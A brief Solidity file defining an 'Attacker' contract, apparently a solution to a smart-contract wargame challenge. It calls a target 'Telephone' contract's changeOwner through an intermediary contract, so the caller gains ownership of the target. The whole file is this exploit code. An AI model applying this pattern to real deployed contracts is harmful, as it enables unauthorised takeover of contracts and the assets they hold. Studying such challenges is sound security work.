// SPDX-License-Identifier: MIT

pragma solidity >=0.8.2 <0.9.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Attacker {
    address telephoneAddress;

    constructor(address _telephoneAddress) {
        telephoneAddress = _telephoneAddress;
    }

    function changeOwner() public {
        ITelephone(telephoneAddress).changeOwner(msg.sender);
    }
}